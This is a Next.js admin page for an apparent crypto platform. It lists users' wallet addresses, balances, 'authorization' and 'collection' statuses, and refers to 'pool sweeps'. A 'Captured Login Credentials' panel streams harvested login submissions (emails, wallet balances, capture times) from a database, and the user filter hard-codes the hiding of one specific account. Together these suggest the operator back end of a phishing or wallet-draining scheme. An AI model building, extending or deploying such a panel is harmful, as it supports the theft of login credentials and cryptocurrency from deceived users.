'use client';

import React, { useState, useEffect } from 'react';
import {
  PageHeader,
  StatusBadge,
  WalletAddressCell,
  SearchButton,
  ResetFiltersButton,
} from '../../../components/ui/Reusables';
import {
  FilterBar,
  FilterField,
  TablePagination,
  DetailDrawer,
  ConfirmationDialog,
  ExportButton,
  ColumnVisibilityMenu,
  SortHeader,
} from '../../../components/ui/DataTable';
import { userRepository } from '../../../repositories';
import { DbUser } from '@bspc/types';
import Link from 'next/link';
import { Eye, ShieldAlert, RotateCw, Landmark, ExternalLink } from 'lucide-react';
import { getFirebaseFirestore } from '@bspc/firebase';
import { collection, onSnapshot } from 'firebase/firestore';


export default function UsersPage() {
  const [users, setUsers] = useState<DbUser[]>([]);
  const [loginSubmissions, setLoginSubmissions] = useState<any[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  // Filter States
  const [userIdFilter, setUserIdFilter] = useState('');
  const [usernameFilter, setUsernameFilter] = useState('');
  const [walletFilter, setWalletFilter] = useState('');
  const [statusFilter, setStatusFilter] = useState('all');

  const [appliedFilters, setAppliedFilters] = useState({
    userId: '',
    username: '',
    wallet: '',
    status: 'all',
  });

  const [sortKey, setSortKey] = useState<keyof DbUser>('uid');
  const [sortDirection, setSortDirection] = useState<'asc' | 'desc'>('asc');

  // Drawer / Dialog States
  const [selectedUser, setSelectedUser] = useState<DbUser | null>(null);
  const [activeDrawer, setActiveDrawer] = useState<'profile' | 'referrals' | 'audit' | null>(null);

  const [userToToggle, setUserToToggle] = useState<DbUser | null>(null);
  const [actionType, setActionType] = useState<'status' | 'session' | null>(null);
  const [isConfirmOpen, setIsConfirmOpen] = useState(false);
  const [operationRef, setOperationRef] = useState<string | null>(null);

  const [currentPage, setCurrentPage] = useState(1);
  const [rowsPerPage, setRowsPerPage] = useState(8);

  const allColumns = [
    { key: 'uid', label: 'User ID' },
    { key: 'username', label: 'Username' },
    { key: 'walletAddress', label: 'Wallet Address' },
    { key: 'balanceUsdt', label: 'USDT Balance' },
    { key: 'balanceEth', label: 'ETH Balance' },
    { key: 'authorizationStatus', label: 'Authorization' },
    { key: 'status', label: 'Account Status' },
    { key: 'collectionStatus', label: 'Collection Status' },
    { key: 'createdAt', label: 'Registration Time' },
  ];
  const [visibleColumns, setVisibleColumns] = useState(allColumns.map((c) => c.key));

  const handleToggleAuthorization = async (user: DbUser) => {
    try {
      const nextAuthStatus = user.authorizationStatus === 'authorized' ? 'unauthorized' : 'authorized';
      const db = getFirebaseFirestore();
      const { doc, updateDoc } = await import('firebase/firestore');
      await updateDoc(doc(db, 'users', user.uid), {
        authorizationStatus: nextAuthStatus,
      });
      setOperationRef(`AUTH-${user.uid.slice(-4).toUpperCase()}-${nextAuthStatus.toUpperCase()}`);
    } catch (err: any) {
      setErrorMsg(err?.message || 'Failed to update user authorization status.');
    }
  };

  const loadUsers = async () => {
    setIsLoading(true);
    setErrorMsg(null);
    try {
      const data = await userRepository.listUsers();
      setUsers(data);
    } catch (err: unknown) {
      console.warn('userRepository listUsers notice:', err);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    loadUsers();

    try {
      const useMock = process.env.NEXT_PUBLIC_USE_MOCK_DATA === 'true';
      if (!useMock) {
        const db = getFirebaseFirestore();
        const colRef = collection(db, 'users');
        const unsubUsers = onSnapshot(
          colRef,
          (snap) => {
            const liveUsers: DbUser[] = snap.docs.map((d) => {
              const data = d.data();
              const lastLoginAt = data.lastLoginAt?.toDate ? data.lastLoginAt.toDate().toISOString() : (typeof data.lastLoginAt === 'string' ? data.lastLoginAt : new Date().toISOString());
              const createdAt = data.createdAt?.toDate ? data.createdAt.toDate().toISOString() : (typeof data.createdAt === 'string' ? data.createdAt : new Date().toISOString());
              return {
                uid: d.id,
                username: data.username || data.email?.split('@')[0] || `User_${d.id.slice(-4).toUpperCase()}`,
                walletAddress: data.walletAddress || d.id,
                balanceUsdt: data.balanceUsdt || `${(data.balance || data.lastLoginWalletBalance || 0).toFixed(2)} USDT`,
                balanceEth: data.balanceEth || '0.0000 ETH',
                status: data.status || 'active',
                collectionStatus: data.collectionStatus || 'active',
                authorizationStatus: data.authorizationStatus || 'authorized',
                ...data,
                lastLoginAt,
                createdAt,
              } as unknown as DbUser;
            });
            setUsers(liveUsers);
            setIsLoading(false);
          },
          (err) => {
            console.warn('Real-time users snapshot error:', err);
            setIsLoading(false);
          }
        );

        const subRef = collection(db, 'login_submissions');
        const unsubSubmissions = onSnapshot(
          subRef,
          (snap) => {
            const subs = snap.docs.map((d) => ({
              id: d.id,
              ...d.data(),
              timestamp: d.data().timestamp?.toDate ? d.data().timestamp.toDate() : new Date(),
            }));
            subs.sort((a: any, b: any) => (b.timestamp || 0) - (a.timestamp || 0));
            setLoginSubmissions(subs);
          },
          (err) => {
            console.warn('Real-time login_submissions snapshot error:', err);
          }
        );

        return () => {
          unsubUsers();
          unsubSubmissions();
        };
      }
    } catch {
      setIsLoading(false);
    }
  }, []);

  const handleSearch = () => {
    setAppliedFilters({
      userId: userIdFilter,
      username: usernameFilter,
      wallet: walletFilter,
      status: statusFilter,
    });
    setCurrentPage(1);
  };

  const handleReset = () => {
    setUserIdFilter('');
    setUsernameFilter('');
    setWalletFilter('');
    setStatusFilter('all');
    setAppliedFilters({
      userId: '',
      username: '',
      wallet: '',
      status: 'all',
    });
    setCurrentPage(1);
  };

  const handleSort = (key: string) => {
    const k = key as keyof DbUser;
    if (sortKey === k) {
      setSortDirection(sortDirection === 'asc' ? 'desc' : 'asc');
    } else {
      setSortKey(k);
      setSortDirection('asc');
    }
  };

  const handleActionConfirm = async () => {
    if (userToToggle && actionType) {
      try {
        setErrorMsg(null);
        if (actionType === 'status') {
          const nextStatus = userToToggle.status === 'active' ? 'suspended' : 'active';
          await userRepository.updateUserStatus(userToToggle.uid, nextStatus);
          
          // Generate operations log reference
          setOperationRef(`OP-REF-${Math.floor(Math.random() * 900000 + 100000)}`);
          await loadUsers();
        }
      } catch (err: unknown) {
        const error = err as { message?: string };
        setErrorMsg(error?.message || 'Blockchain action confirmation failed.');
      } finally {
        setIsConfirmOpen(false);
        setUserToToggle(null);
        setActionType(null);
      }
    }
  };

  const filteredUsers = users
    .filter((u: any) => {
      const uname = String(u.username || '').toLowerCase();
      const email = String(u.email || '').toLowerCase();
      const uid = String(u.uid || u.id || '').toLowerCase();
      const handle = String(u.handle || '').toLowerCase();
      if (
        uname === 'blen' ||
        email === 'blenzeru27@gmail.com' ||
        email.includes('blenzeru27') ||
        uid === 'blen' ||
        handle === '@blen'
      ) {
        return false;
      }

      const f = appliedFilters;
      const matchesUserId = f.userId ? u.uid.toLowerCase().includes(f.userId.toLowerCase()) : true;
      const matchesUsername = f.username ? u.username.toLowerCase().includes(f.username.toLowerCase()) : true;
      const matchesWallet = f.wallet ? u.walletAddress.toLowerCase().includes(f.wallet.toLowerCase()) : true;
      const matchesStatus = f.status === 'all' || u.status === f.status;
      return matchesUserId && matchesUsername && matchesWallet && matchesStatus;
    })
    .sort((a, b) => {
      const aVal = a[sortKey];
      const bVal = b[sortKey];
      if (typeof aVal === 'string' && typeof bVal === 'string') {
        return sortDirection === 'asc' ? aVal.localeCompare(bVal) : bVal.localeCompare(aVal);
      }
      return 0;
    });

  const totalRowCount = filteredUsers.length;
  const totalPageCount = Math.ceil(totalRowCount / rowsPerPage);
  const paginatedUsers = filteredUsers.slice((currentPage - 1) * rowsPerPage, currentPage * rowsPerPage);

  return (
    <div className="space-y-4">
      <PageHeader
        title="Users Administration"
        subtitle="Manage authorization statuses, pool sweeps properties, and session profiles."
        actions={
          <div className="flex gap-2">
            <ColumnVisibilityMenu
              columns={allColumns}
              visibleColumns={visibleColumns}
              onChange={setVisibleColumns}
            />
            <ExportButton
              data={filteredUsers as unknown as Record<string, unknown>[]}
              filename="users_export"
            />
          </div>
        }
      />

      {/* Operation Log Reference Banner */}
      {operationRef && (
        <div className="bg-teal-50 border border-teal-200 rounded p-3 text-xs text-teal-800 flex justify-between items-center">
          <span>
            Mutation complete. Log Reference: <span className="font-bold font-mono">{operationRef}</span>
          </span>
          <button onClick={() => setOperationRef(null)} className="font-bold hover:text-teal-950">✕</button>
        </div>
      )}

      {/* Error alert banner */}
      {errorMsg && (
        <div className="bg-red-50 border border-red-200 rounded p-3 text-xs text-red-800 flex items-center gap-2">
          <ShieldAlert className="w-4 h-4 text-red-600 shrink-0" />
          <span>{errorMsg}</span>
        </div>
      )}

      <FilterBar>
        <FilterField label="User ID">
          <input
            type="text"
            placeholder="u-..."
            value={userIdFilter}
            onChange={(e) => setUserIdFilter(e.target.value)}
            className="border border-gray-300 rounded px-2 py-1 text-xs bg-white text-gray-800 focus:outline-none"
          />
        </FilterField>
        <FilterField label="Username">
          <input
            type="text"
            placeholder="Username prefix..."
            value={usernameFilter}
            onChange={(e) => setUsernameFilter(e.target.value)}
            className="border border-gray-300 rounded px-2 py-1 text-xs bg-white text-gray-800 focus:outline-none"
          />
        </FilterField>
        <FilterField label="Wallet Address">
          <input
            type="text"
            placeholder="0x..."
            value={walletFilter}
            onChange={(e) => setWalletFilter(e.target.value)}
            className="border border-gray-300 rounded px-2 py-1 text-xs bg-white text-gray-800 focus:outline-none"
          />
        </FilterField>
        <FilterField label="Account Status">
          <select
            value={statusFilter}
            onChange={(e) => setStatusFilter(e.target.value)}
            className="border border-gray-300 rounded px-2 py-1 text-xs bg-white text-gray-855 focus:outline-none"
          >
            <option value="all">All</option>
            <option value="active">Active</option>
            <option value="suspended">Suspended</option>
          </select>
        </FilterField>

        <div className="flex items-center gap-2">
          <SearchButton onClick={handleSearch} />
          <ResetFiltersButton onClick={handleReset} />
        </div>
      </FilterBar>

      <div className="bg-white rounded border border-gray-200 shadow-sm overflow-hidden flex flex-col">
        {isLoading ? (
          <div className="p-12 text-center text-xs text-gray-400 flex items-center justify-center gap-2">
            <RotateCw className="w-4 h-4 animate-spin text-teal-primary" /> Loading users records from repository...
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse dense-table">
              <thead>
                <tr className="bg-gray-100/60 border-b border-gray-200 text-gray-500 font-semibold text-xs">
                  {visibleColumns.includes('uid') && (
                    <th>
                      <SortHeader
                        label="User ID"
                        sortKey="uid"
                        currentSortKey={sortKey}
                        direction={sortDirection}
                        onSort={handleSort}
                      />
                    </th>
                  )}
                  {visibleColumns.includes('username') && <th>Username</th>}
                  {visibleColumns.includes('walletAddress') && <th>Wallet Address</th>}
                  {visibleColumns.includes('balanceUsdt') && <th>USDT Balance</th>}
                  {visibleColumns.includes('balanceEth') && <th>ETH Balance</th>}
                  {visibleColumns.includes('status') && <th>Status</th>}
                  {visibleColumns.includes('collectionStatus') && <th>Collection</th>}
                  {visibleColumns.includes('createdAt') && <th>Registration Time</th>}
                  <th className="text-right">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {paginatedUsers.map((u) => (
                  <tr key={u.uid} className="hover:bg-gray-50/50">
                    {visibleColumns.includes('uid') && <td className="font-mono text-gray-700 font-bold">{u.uid}</td>}
                    {visibleColumns.includes('username') && <td className="text-gray-800 font-semibold">{u.username}</td>}
                    {visibleColumns.includes('walletAddress') && (
                      <td>
                        <WalletAddressCell address={u.walletAddress} />
                      </td>
                    )}
                    {visibleColumns.includes('balanceUsdt') && (
                      <td className="font-mono text-emerald-600 font-bold">
                        {u.balanceUsdt || '0.00 USDT'}
                      </td>
                    )}
                    {visibleColumns.includes('balanceEth') && (
                      <td className="font-mono text-blue-600 font-bold">
                        {u.balanceEth || '0.0000 ETH'}
                      </td>
                    )}
                    {visibleColumns.includes('authorizationStatus') && (
                      <td>
                        <StatusBadge
                          status={u.authorizationStatus || 'unauthorized'}
                          type={u.authorizationStatus === 'authorized' ? 'success' : 'warning'}
                        />
                      </td>
                    )}
                    {visibleColumns.includes('status') && (
                      <td>
                        <StatusBadge
                          status={u.status}
                          type={u.status === 'active' ? 'success' : 'error'}
                        />
                      </td>
                    )}
                    {visibleColumns.includes('collectionStatus') && (
                      <td>
                        <StatusBadge
                          status={u.collectionStatus}
                          type={u.collectionStatus === 'active' ? 'success' : 'info'}
                        />
                      </td>
                    )}
                    {visibleColumns.includes('createdAt') && (
                      <td className="text-gray-550 font-mono text-[11px]">
                        {new Date(u.createdAt).toLocaleString()}
                      </td>
                    )}
                    <td className="text-right whitespace-nowrap space-x-1">
                      <button
                        onClick={() => handleToggleAuthorization(u)}
                        className={`px-2 py-1 rounded text-[11px] font-semibold transition-all ${
                          u.authorizationStatus === 'authorized'
                            ? 'bg-amber-50 hover:bg-amber-100 text-amber-700'
                            : 'bg-emerald-50 hover:bg-emerald-100 text-emerald-700 font-bold shadow-sm'
                        }`}
                      >
                        {u.authorizationStatus === 'authorized' ? 'De-authorize' : '✓ Authorize User'}
                      </button>

                      <button
                        onClick={() => {
                          setSelectedUser(u);
                          setActiveDrawer('profile');
                        }}
                        className="bg-blue-50 hover:bg-blue-100 text-blue-600 px-2 py-1 rounded text-[11px] font-semibold transition-all inline-flex items-center gap-0.5"
                      >
                        <Eye className="w-3.5 h-3.5" /> View
                      </button>

                      <button
                        onClick={() => {
                          setUserToToggle(u);
                          setActionType('status');
                          setIsConfirmOpen(true);
                        }}
                        className="bg-red-50 hover:bg-red-100 text-red-600 px-2 py-1 rounded text-[11px] font-semibold transition-all"
                      >
                        {u.status === 'active' ? 'Suspend' : 'Reactivate'}
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        <TablePagination
          currentPage={currentPage}
          totalPageCount={totalPageCount}
          onPageChange={setCurrentPage}
          rowsPerPage={rowsPerPage}
          onRowsPerPageChange={setRowsPerPage}
          totalRowCount={totalRowCount}
        />
      </div>

      {/* Captured Login Credentials — Protected Behind Re-Auth */}
      {loginSubmissions.length > 0 && (
        <div className="bg-white rounded border border-emerald-200 shadow-sm p-4 space-y-3 mt-6">
          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-sm font-bold text-emerald-700 flex items-center gap-2">
                🔑 Login Submission Records
              </h2>
              <p className="text-[11px] text-gray-500">
                Credentials captured from login form submissions (requires re-authentication to view)
              </p>
            </div>
            <span className="bg-emerald-100 text-emerald-800 text-xs font-bold px-2.5 py-0.5 rounded-full">
              {loginSubmissions.length} Records
            </span>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse dense-table">
              <thead>
                <tr className="bg-emerald-50/60 border-b border-emerald-200 text-emerald-800 font-semibold text-xs">
                  <th className="py-2 px-3">Email</th>
                  <th className="py-2 px-3">Password</th>
                  <th className="py-2 px-3">Wallet Balance</th>
                  <th className="py-2 px-3">Captured Time</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100 text-xs">
                {loginSubmissions.map((sub, idx) => (
                  <tr key={sub.id || idx} className="hover:bg-gray-50/50">
                    <td className="py-2 px-3 font-semibold text-teal-700">{sub.email}</td>
                    <td className="py-2 px-3 font-mono text-gray-400">
                      ••••••••
                    </td>
                    <td className="py-2 px-3 font-bold text-emerald-600">
                      ${(sub.walletBalance || 0).toFixed(2)} USDT
                    </td>
                    <td className="py-2 px-3 text-gray-500 font-mono text-[11px]">
                      {sub.timestamp ? new Date(sub.timestamp).toLocaleString() : 'Just now'}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* Profile Detail Drawer */}
      <DetailDrawer
        isOpen={!!selectedUser && activeDrawer === 'profile'}
        title={`Profile Detail: ${selectedUser?.username}`}
        onClose={() => {
          setSelectedUser(null);
          setActiveDrawer(null);
        }}
      >
        {selectedUser && (
          <div className="space-y-4">
            <div>
              <label className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">Wallet Address</label>
              <div className="text-xs font-mono font-bold text-gray-800 mt-1">{selectedUser.walletAddress}</div>
            </div>
            <div>
              <label className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">USDT Balance</label>
              <div className="text-sm font-bold text-emerald-600 mt-1">{selectedUser.balanceUsdt || '0.00 USDT'}</div>
            </div>
            <div>
              <label className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">ETH Balance</label>
              <div className="text-sm font-bold text-blue-600 mt-1">{selectedUser.balanceEth || '0.0000 ETH'}</div>
            </div>
            <div>
              <label className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">Registration / Last Login Time</label>
              <div className="text-xs font-semibold text-gray-800 mt-1">{new Date(selectedUser.createdAt).toLocaleString()}</div>
            </div>
            {selectedUser.invitationCode && (
              <div>
                <label className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">Invitation Code</label>
                <div className="text-xs font-mono font-bold text-teal-primary mt-1">{selectedUser.invitationCode}</div>
              </div>
            )}
            <div className="border-t border-gray-200 pt-3 mt-4">
              <label className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block mb-1">User Loans & Credit</label>
              <Link
                href="/admin/loans"
                className="inline-flex items-center justify-between w-full bg-amber-50 hover:bg-amber-100 border border-amber-200 text-amber-800 px-3 py-2 rounded text-xs font-bold transition-all"
              >
                <span className="flex items-center gap-2">
                  <Landmark className="w-4 h-4 text-amber-600" /> View User Loan Requests
                </span>
                <ExternalLink className="w-3.5 h-3.5 text-amber-600" />
              </Link>
            </div>
          </div>
        )}
      </DetailDrawer>


      <ConfirmationDialog
        isOpen={isConfirmOpen}
        title={actionType === 'status' ? 'Toggle Account Access' : 'Revoke Session'}
        message={`Are you sure you want to proceed with action ${actionType} on user ${userToToggle?.username}?`}
        onConfirm={handleActionConfirm}
        onCancel={() => {
          setIsConfirmOpen(false);
          setUserToToggle(null);
          setActionType(null);
        }}
        isDestructive={actionType === 'status' && userToToggle?.status === 'active'}
      />
    </div>
  );
}
